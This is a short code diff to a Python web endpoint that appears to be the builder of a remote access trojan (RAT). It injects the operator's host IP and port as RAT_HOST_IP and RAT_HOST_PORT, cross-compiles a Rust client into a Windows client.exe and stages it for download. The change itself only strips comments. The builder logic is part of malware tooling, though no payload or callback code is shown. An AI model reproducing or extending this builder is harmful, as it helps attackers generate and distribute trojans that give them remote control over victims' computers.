@@ -12,7 +12,6 @@ BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 TEMPLATE_DIR = os.path.join(BASE_DIR, "..", "templates")
 templates = Jinja2Templates(directory=TEMPLATE_DIR)
 
-# Assume the client project is one level up from the 'host' directory
 CLIENT_PROJECT_PATH = os.path.abspath(os.path.join(BASE_DIR, "..", "client"))
 
 
@@ -32,16 +31,11 @@ async def build_client(
     build_env["RAT_HOST_IP"] = host_ip
     build_env["RAT_HOST_PORT"] = port
 
-    # --- FIX: Determine the correct executable name based on the build server's OS ---
-    # We build for Windows target, but check what cargo creates
     target_triple = "x86_64-pc-windows-gnu"
     build_command = ["cargo", "build", "--release", "--target", target_triple]
 
-    # The output path cargo creates
     source_executable_name = "client.exe"
     built_file_path = os.path.join(CLIENT_PROJECT_PATH, "target", target_triple, "release", source_executable_name)
-
-    # --- End Fix ---
 
     process = await asyncio.create_subprocess_exec(
         *build_command,
@@ -57,7 +51,6 @@ async def build_client(
     if process.returncode == 0 and os.path.exists(built_file_path):
         download_url = f"/builder/download/{client_name}"
 
-        # The final path where we store the downloadable file (inside the 'host' dir)
         downloadable_file_path = os.path.join(BASE_DIR, "..", client_name)
 
         os.rename(built_file_path, downloadable_file_path)
